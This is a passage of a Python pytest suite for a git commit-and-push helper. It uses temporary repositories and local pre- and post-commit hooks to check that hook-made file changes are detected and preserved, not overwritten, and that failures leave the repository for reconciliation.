    assert effect["reconciliation_required"] is True
    assert effect["worktree_index_preserved"] is True
    assert (repo / "tracked.txt").read_text() == "hook-recreated-untracked\n"
    assert not any(substep["name"].startswith("git_clean") for substep in effect["substeps"])


def test_commit_staged_index_preserves_staged_hook_recreation_after_failure(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-hook-delete")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    before = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nprintf 'hook-recreated\n' > tracked.txt\ngit add tracked.txt\nexit 1\n")
    hook.chmod(0o755)
    assert run(["git", "rm", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["restore_reviewed_index_ok"] is False
    assert effect["restore_reviewed_worktree_ok"] is False
    assert effect["reconciliation_required"] is True
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
    assert run(["git", "write-tree"], repo).stdout.strip() != effect["expected_tree"]
    assert (repo / "tracked.txt").read_text() == "hook-recreated\n"


def test_commit_staged_index_does_not_call_restore_after_failed_hook(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-hook-delete-pathspec-abort")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    before = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nprintf 'hook-recreated\n' > tracked.txt\ngit add tracked.txt\nexit 1\n")
    hook.chmod(0o755)
    assert run(["git", "rm", "tracked.txt"], repo).returncode == 0

    original_run_safe = ns["commit_staged_index"].__globals__["run_safe"]

    def fake_run_safe(cmd, *args, **kwargs):
        if cmd[:2] == ["git", "restore"] and "--staged" in cmd and ":(literal)tracked.txt" in cmd:
            return {"cmd": cmd, "returncode": 1, "ok": False, "stdout_tail": "", "stderr_tail": "error: pathspec 'tracked.txt' did not match any file(s) known to git"}
        return original_run_safe(cmd, *args, **kwargs)

    monkeypatch.setitem(ns["commit_staged_index"].__globals__, "run_safe", fake_run_safe)

    effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["restore_reviewed_index_ok"] is False
    assert effect["restore_reviewed_worktree_ok"] is False
    assert effect["reconciliation_required"] is True
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
    assert run(["git", "write-tree"], repo).stdout.strip() != effect["expected_tree"]
    assert (repo / "tracked.txt").read_text() == "hook-recreated\n"
    assert not any(substep["name"].startswith("git_restore") for substep in effect["substeps"])


def test_commit_staged_index_preserves_many_reviewed_paths_without_restore(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-many-reviewed-paths")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    for index in range(105):
        path = repo / f"file-{index:03d}.txt"
        path.write_text("one\n")
        assert run(["git", "add", path.name], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    for index in range(105):
        (repo / f"file-{index:03d}.txt").write_text("reviewed\n")
    assert run(["git", "add", "-A"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nexit 1\n")
    hook.chmod(0o755)

    effect = ns["commit_staged_index"](repo, "many paths", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["restore_reviewed_index_ok"] is False
    assert effect["restore_reviewed_worktree_ok"] is False
    assert effect["reconciliation_required"] is True
    assert all((repo / f"file-{index:03d}.txt").read_text() == "reviewed\n" for index in range(105))
    assert not any(substep["name"].startswith("git_restore") for substep in effect["substeps"])


def test_commit_staged_index_detects_modified_preexisting_untracked_file(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-preexisting-untracked-modified")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    (repo / "note.tmp").write_text("untracked note\n")
    hook = repo / ".git" / "hooks" / "post-commit"
    hook.write_text("#!/bin/sh\nprintf 'modified untracked note\n' > note.tmp\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "detect untracked modification", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert effect["warning"] == "post_commit_concurrent_work_preserved"
    assert (repo / "note.tmp").read_text() == "modified untracked note\n"


def test_commit_staged_index_allows_preexisting_unrelated_untracked_file(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-preexisting-untracked")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    (repo / "note.tmp").write_text("untracked note\n")
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "allow unrelated untracked", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert (repo / "note.tmp").read_text() == "untracked note\n"
    assert run(["git", "log", "-1", "--format=%s"], repo).stdout.strip() == "allow unrelated untracked"


def test_commit_staged_index_rejects_untracked_added_after_reviewed_baseline(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-reviewed-untracked-baseline")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    (repo / "reviewed.tmp").write_text("reviewed untracked\n")
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    reviewed_status = run(["git", "status", "--porcelain=v1", "--untracked-files=all"], repo).stdout
    reviewed_untracked = {"reviewed.tmp": ns["untracked_file_identity"](repo, "reviewed.tmp")}
    (repo / "inserted.tmp").write_text("not reviewed\n")

    effect = ns["commit_staged_index"](
        repo,
        "reject inserted untracked",
        reviewed_status=reviewed_status,
        reviewed_untracked_snapshot=reviewed_untracked,
        disable_hooks=True,
    )

    assert effect["ok"] is False
    assert effect["error"] == "pre_commit_status_changed_after_review"
    assert (repo / "reviewed.tmp").read_text() == "reviewed untracked\n"
    assert (repo / "inserted.tmp").read_text() == "not reviewed\n"
    assert run(["git", "log", "-1", "--format=%s"], repo).stdout.strip() == "init"


def test_commit_staged_index_allows_large_preexisting_unrelated_untracked_file(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-large-preexisting-untracked")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    (repo / "large.tmp").write_bytes(b"x" * (ns["MARKER_FINGERPRINT_MAX_BYTES"] + 1))
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "allow large unrelated untracked", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert "warning" not in effect
    assert (repo / "large.tmp").stat().st_size == ns["MARKER_FINGERPRINT_MAX_BYTES"] + 1
    assert run(["git", "log", "-1", "--format=%s"], repo).stdout.strip() == "allow large unrelated untracked"


def test_commit_staged_index_does_not_fingerprint_unrelated_preexisting_untracked_file(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-unrelated-untracked-no-fingerprint")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    (repo / "note.tmp").write_text("untracked note\n")
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    original_fingerprint = ns["commit_staged_index"].__globals__["marker_file_fingerprint"]

    def fake_marker_file_fingerprint(repo_arg, path):
        if path == "note.tmp":
            raise AssertionError("unrelated pre-existing untracked files must not be content-hashed")
        return original_fingerprint(repo_arg, path)

    monkeypatch.setitem(ns["commit_staged_index"].__globals__, "marker_file_fingerprint", fake_marker_file_fingerprint)

    effect = ns["commit_staged_index"](repo, "allow unrelated untracked", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert "warning" not in effect
    assert (repo / "note.tmp").read_text() == "untracked note\n"


def test_commit_staged_index_detects_marker_drift_without_generic_untracked_identity(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-marker-drift-no-untracked-identity")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    marker = repo / ".claude" / "litmus-passed.local"
    marker.parent.mkdir()
    marker.write_text("marker-before\n")
    hook = repo / ".git" / "hooks" / "post-commit"
    hook.write_text("#!/bin/sh\nprintf 'marker-after\\n' > .claude/litmus-passed.local\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    original_identity = ns["commit_staged_index"].__globals__["untracked_file_identity"]

    def fake_untracked_file_identity(repo_arg, path):
        if path == ".claude/litmus-passed.local":
            raise AssertionError("marker drift must be handled before generic untracked identity checks")
        return original_identity(repo_arg, path)

    monkeypatch.setitem(ns["commit_staged_index"].__globals__, "untracked_file_identity", fake_untracked_file_identity)

    effect = ns["commit_staged_index"](repo, "marker drift", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert effect["warning"] == "post_commit_concurrent_work_preserved"
    assert ".claude/litmus-passed.local" in effect["post_commit_dirty_paths"]


def test_commit_staged_index_blocks_preexisting_unstaged_reviewed_file_dirty(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-preexisting-unstaged")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    (repo / "tracked.txt").write_text("user-unstaged\n")

    effect = ns["commit_staged_index"](repo, "must not overwrite unstaged", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["error"] == "pre_commit_non_marker_dirty_worktree"
    assert (repo / "tracked.txt").read_text() == "user-unstaged\n"
    assert run(["git", "log", "-1", "--format=%s"], repo).stdout.strip() == "init"


def test_commit_staged_index_preserves_concurrent_reviewed_path_after_cas_rollback(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-cas-rollback-preserve")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("before\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    before = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    globals_ = ns["commit_staged_index"].__globals__
    real_run_safe = globals_["run_safe"]
    real_git_output = globals_["git_output"]
    update_ref_calls = {"count": 0}

    def fake_run_safe(cmd, *args, **kwargs):
        if cmd[:2] == ["git", "update-ref"]:
            update_ref_calls["count"] += 1
            if update_ref_calls["count"] == 2:
                (repo / "tracked.txt").write_text("concurrent-after-publish\n")
        return real_run_safe(cmd, *args, **kwargs)

    def fake_git_output(repo_arg, *args):
        if args[:3] == ("log", "-1", "--format=%B"):
            return 0, "wrong-message\n", ""
        return real_git_output(repo_arg, *args)

    monkeypatch.setitem(globals_, "run_safe", fake_run_safe)
    monkeypatch.setitem(globals_, "git_output", fake_git_output)

    effect = ns["commit_staged_index"](
        repo, "reviewed message", {"BUSDRIVER_STATE_DIR": ".claude"}, disable_hooks=True,
    )

    assert effect["ok"] is False
    assert effect["error"] == "committed_message_mismatch_after_hooks"
    assert effect["reconciliation_required"] is True
    assert effect["worktree_index_preserved"] is True
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
    assert (repo / "tracked.txt").read_text() == "concurrent-after-publish\n"
    assert not any(
        step["name"].startswith(("git_restore", "git_clean", "git_remove"))
        for step in effect["substeps"]
    )


def test_commit_staged_index_preserves_concurrent_untracked_recreation_after_publish(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-post-commit-delete-untracked")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "post-commit"
    hook.write_text("#!/bin/sh\nprintf 'post-commit-recreated-untracked\n' > tracked.txt\n")
    hook.chmod(0o755)
    assert run(["git", "rm", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert (repo / "tracked.txt").read_text() == "post-commit-recreated-untracked\n"
    assert effect["warning"] == "post_commit_concurrent_work_preserved"


def test_commit_staged_index_preserves_concurrent_staged_recreation_after_publish(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-post-commit-delete-index-drift")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "post-commit"
    hook.write_text("#!/bin/sh\nprintf 'post-commit-recreated-and-staged\n' > tracked.txt\ngit add tracked.txt\n")
    hook.chmod(0o755)
    assert run(["git", "rm", "tracked.txt"], repo).returncode == 0

    original_run_safe = ns["commit_staged_index"].__globals__["run_safe"]

    def fake_run_safe(cmd, *args, **kwargs):
        if cmd[:2] == ["git", "restore"] and "--staged" in cmd and ":(literal)tracked.txt" in cmd:
            return {"cmd": cmd, "returncode": 1, "ok": False, "stdout_tail": "", "stderr_tail": "error: pathspec 'tracked.txt' did not match any file(s) known to git"}
        return original_run_safe(cmd, *args, **kwargs)

    monkeypatch.setitem(ns["commit_staged_index"].__globals__, "run_safe", fake_run_safe)

    effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert (repo / "tracked.txt").read_text() == "post-commit-recreated-and-staged\n"
    assert effect["warning"] == "post_commit_concurrent_work_preserved"


def test_commit_staged_index_preserves_tracked_concurrent_post_publish_drift(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-post-commit-drift")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "post-commit"
    hook.write_text("#!/bin/sh\nprintf 'post-commit-drift\n' > tracked.txt\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "post commit drift", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert (repo / "tracked.txt").read_text() == "post-commit-drift\n"
    assert effect["warning"] == "post_commit_concurrent_work_preserved"


def test_commit_staged_index_detects_hook_created_invalid_marker(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-invalid-marker-post-commit")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    (repo / ".claude").mkdir()
    outside = tmp_path / "outside-marker-target"
    outside.write_text("outside\n")
    hook = repo / ".git" / "hooks" / "post-commit"
    hook.write_text(f"#!/bin/sh\nln -s {shlex.quote(str(outside))} .claude/litmus-passed.local\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "invalid marker", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert effect["warning"] == "post_commit_concurrent_work_preserved"
    assert (repo / ".claude" / "litmus-passed.local").is_symlink()


def test_commit_staged_index_fails_closed_when_post_commit_status_unavailable(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-post-commit-status-failed")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    before = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    real_git_output = ns["git_output"]
    status_calls = {"count": 0}

    def fake_git_output(repo_arg, *args):
        if args[:1] == ("status",):
            status_calls["count"] += 1
            if status_calls["count"] > 2:
                return 128, "", "status unavailable"
        return real_git_output(repo_arg, *args)

    monkeypatch.setitem(ns["commit_staged_index"].__globals__, "git_output", fake_git_output)

    effect = ns["commit_staged_index"](repo, "status unavailable", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["error"] == "post_commit_status_failed"
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() != before


def test_commit_staged_index_completes_with_warning_without_overwriting_external_post_commit_drift(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-post-commit-external-drift")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    (repo / "external.txt").write_text("external-before\n")
    assert run(["git", "add", "tracked.txt", "external.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "post-commit"
    hook.write_text("#!/bin/sh\nprintf 'external-drift\n' > external.txt\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "external post commit drift", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is True
    assert effect["warning"] == "post_commit_concurrent_work_preserved"
    assert (repo / "external.txt").read_text() == "external-drift\n"
    assert any(substep["name"] == "git_post_commit_concurrent_work_left_for_operator" for substep in effect["substeps"])


def test_commit_staged_index_preserves_absolute_marker_state_dir_dirty(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-absolute-marker")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    state_dir = repo / ".custom-state"
    state_dir.mkdir()
    (state_dir / "litmus-passed.local").write_text("tracked-marker\n")
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", ".custom-state/litmus-passed.local", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nprintf 'hook-mutated\n' > tracked.txt\ngit add tracked.txt\nexit 1\n")
    hook.chmod(0o755)
    (state_dir / "litmus-passed.local").write_text("allowed-absolute-marker-dirty\n")
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "preserve abs marker", {"BUSDRIVER_STATE_DIR": str(state_dir)})

    assert effect["ok"] is False
    assert effect["reconciliation_required"] is True
    assert (repo / "tracked.txt").read_text() == "hook-mutated\n"
    assert (state_dir / "litmus-passed.local").read_text() == "allowed-absolute-marker-dirty\n"


def test_commit_staged_index_detects_hook_rewritten_preexisting_marker_dirty(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-marker-rewrite")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / ".claude").mkdir()
    (repo / ".claude" / "litmus-passed.local").write_text("tracked-marker\n")
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", ".claude/litmus-passed.local", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nprintf 'hook-rewrote-marker\n' > .claude/litmus-passed.local\nprintf 'hook-mutated\n' > tracked.txt\ngit add tracked.txt\nexit 1\n")
    hook.chmod(0o755)
    (repo / ".claude" / "litmus-passed.local").write_text("allowed-marker-dirty\n")
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "detect marker rewrite", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["restore_reviewed_worktree_ok"] is False
    assert effect["reconciliation_required"] is True
    assert (repo / ".claude" / "litmus-passed.local").read_text() == "hook-rewrote-marker\n"
    assert any(substep["name"] == "git_status_after_failed_commit_rollback_preserve" for substep in effect["substeps"])


def test_commit_staged_index_detects_deleted_preexisting_untracked_marker(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-marker-delete")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / ".claude").mkdir()
    (repo / ".claude" / "litmus-passed.local").write_text("untracked-marker\n")
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nrm -f .claude/litmus-passed.local\nprintf 'hook-mutated\n' > tracked.txt\ngit add tracked.txt\nexit 1\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "detect marker delete", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["restore_reviewed_worktree_ok"] is False
    assert effect["reconciliation_required"] is True
    assert not (repo / ".claude" / "litmus-passed.local").exists()
    assert any(substep["name"] == "git_status_after_failed_commit_rollback_preserve" for substep in effect["substeps"])


def test_commit_staged_index_preserves_preexisting_marker_dirty_on_hook_failure(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-marker-preserve")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / ".claude").mkdir()
    (repo / ".opencode").mkdir()
    (repo / ".claude" / "litmus-passed.local").write_text("tracked-marker\n")
    (repo / ".opencode" / "pr-review-passed.local").write_text("tracked-opencode-marker\n")
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", ".claude/litmus-passed.local", ".opencode/pr-review-passed.local", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nprintf 'hook-mutated\n' > tracked.txt\ngit add tracked.txt\nexit 1\n")
    hook.chmod(0o755)
    (repo / ".claude" / "litmus-passed.local").write_text("allowed-marker-dirty\n")
    (repo / ".opencode" / "pr-review-passed.local").write_text("allowed-opencode-marker-dirty\n")
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "preserve marker", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["reconciliation_required"] is True
    assert (repo / "tracked.txt").read_text() == "hook-mutated\n"
    assert (repo / ".claude" / "litmus-passed.local").read_text() == "allowed-marker-dirty\n"
    assert (repo / ".opencode" / "pr-review-passed.local").read_text() == "allowed-opencode-marker-dirty\n"


def test_push_success_requires_remote_head_to_match_local_head(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-push-mismatch")
    plugin = fake_busdriver(tmp_path / "busdriver-push-mismatch")
    globals_ = ns["execute_mutating_operation"].__globals__
    mock_isolated_push(monkeypatch, globals_, True)
    delivery_status = delivery_status_for_mutation(repo, "pr_review_fresh", "pr_review_fresh")
    live_head_calls = {"count": 0}

    def fake_live_remote_branch_head(_repo, _branch, _remote):
        live_head_calls["count"] += 1
        if live_head_calls["count"] == 1:
            return None, "remote_branch_not_found"
        return "older-remote-head", None

    monkeypatch.setitem(globals_, "acquire_finalization_lock", lambda _repo, _state_dir=None: {"acquired": True, "token": "lock-token"})
    monkeypatch.setitem(globals_, "release_finalization_lock", lambda _repo, _token, _state_dir=None: {"released": True})
    monkeypatch.setitem(globals_, "run_delivery_status", lambda _args, include_lock_status=False: (delivery_status, 0))
    monkeypatch.setitem(globals_, "repo_blocking_dirty_entries", lambda _repo, _dirs: [])
    monkeypatch.setitem(globals_, "current_branch", lambda _repo: "feature")
    monkeypatch.setitem(globals_, "valid_local_branch_name", lambda _repo, _branch: True)
    monkeypatch.setitem(globals_, "push_remote_safety", lambda _repo, _remote: (True, None))
    monkeypatch.setitem(globals_, "github_remote_url", lambda _repo, _remote: "https://github.com/owner/repo.git")
    monkeypatch.setitem(globals_, "pr_review_base_matches", lambda *_args, **_kwargs: True)
    monkeypatch.setitem(globals_, "remote_head_ancestor_status", lambda *_args: (True, None))
    monkeypatch.setitem(globals_, "live_remote_branch_head", fake_live_remote_branch_head)
    def fake_git_output(_repo, *args):
        if args[:2] == ("rev-parse", "HEAD"):
            return 0, "reviewed-local-head", ""
        if args[:1] == ("status",):
            return 0, "", ""
        return 0, "origin/main", ""
    monkeypatch.setitem(globals_, "git_output", fake_git_output)
    monkeypatch.setitem(globals_, "run_safe", lambda _cmd, _repo, **_kwargs: {"ok": True, "returncode": 0})
